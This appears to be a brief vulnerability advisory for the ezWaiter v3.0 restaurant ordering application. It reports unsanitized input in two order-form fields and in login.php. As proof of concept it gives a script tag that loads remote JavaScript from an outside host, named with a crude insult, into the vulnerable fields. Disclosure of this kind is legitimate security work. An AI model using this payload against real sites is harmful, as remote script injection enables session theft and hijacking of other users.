ezWaiter v3.0

Homepage:
http://www.ezwaiter.com/

Affected files:

Placing an order
login.php
-------------------------------------------

XSS vuln when placing an order:

User input is not sanatized before being generated. For a PoC in the two boxes labeled
"Who is this item for?" and "Special Instructions:"

put:

<SCRIPT SRC=http://youfucktard.com/xss.js></SCRIPT>

The login form found on login.php can be spoofed to remove the max char limits. It too doesn't sanatize data.
